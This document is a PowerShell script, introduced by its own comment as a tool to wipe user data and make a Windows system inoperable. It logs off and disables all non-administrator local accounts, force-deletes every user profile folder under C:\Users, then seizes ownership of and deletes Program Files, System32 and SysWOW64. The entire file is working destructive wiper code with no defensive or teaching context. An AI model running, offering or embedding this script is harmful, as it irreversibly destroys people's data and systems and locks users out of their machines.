# PowerShell script to wipe user data and then make the Windows system inoperable

# Function to delete user data
function Wipe-UserData {
    $userFolders = Get-ChildItem C:\Users -Directory

    foreach ($folder in $userFolders) {
        if ($folder.Name -notlike "Public" -and $folder.Name -notlike "Default*" -and $folder.Name -notlike "Administrator") {
            $path = $folder.FullName
            Write-Host "Wiping user data in $path"
            Remove-Item -Path $path -Recurse -Force
        }
    }
}

# Function to delete critical system files and directories
function Wipe-SystemFiles {
    $criticalPaths = @(
        "C:\Program Files",
        "C:\Program Files (x86)",
        "C:\Windows\System32",
        "C:\Windows\SysWOW64"
        # Add other critical paths as necessary
    )

    foreach ($path in $criticalPaths) {
        if (Test-Path $path) {
            try {
                Takeown /f $path /r /d y
                Icacls $path /grant administrators:F /t
                Remove-Item -Path $path -Recurse -Force
                Write-Host "Wiped $path"
            } catch {
                Write-Host "Failed to wipe $path"
            }
        }
    }
}

# Log off all non-administrative users
$loggedOffUsers = @{}
Get-WmiObject -Class Win32_UserProfile | Where-Object { $_.Special -eq $false } | ForEach-Object {
    $username = $_.LocalPath.Split('\')[-1]
    if ($username -ne "Administrator" -and $username -ne $env:USERNAME -and -not $loggedOffUsers.ContainsKey($username)) {
        try {
            $userSessions = query user | Where-Object { $_ -match "\b$username\b" }
            foreach ($session in $userSessions) {
                if ($session -match "\s+(\d+)\s+Disc\s+") {
                    # Disconnected sessions can't be logged off
                    continue
                }
                elseif ($session -match "\s+(\d+)\s+") {
                    $sessionID = $matches[1]
                    logoff $sessionID
                    $loggedOffUsers[$username] = $true
                    Write-Host "Logged out user: $username"
                }
            }
        } catch {
            Write-Host "Could not log off user: $username. Error: $($_.Exception.Message)"
        }
    }
}

# Disable all non-administrative local user accounts
Get-LocalUser | Where-Object { $_.Enabled -eq $true -and $_.Name -ne "Administrator" } | ForEach-Object {
    $username = $_.Name
    Disable-LocalUser -Name $username
    Write-Host "Disabled account for $username"
}

# Start the wiping process
Wipe-UserData
Wipe-SystemFiles

Write-Host "Wiping process completed."
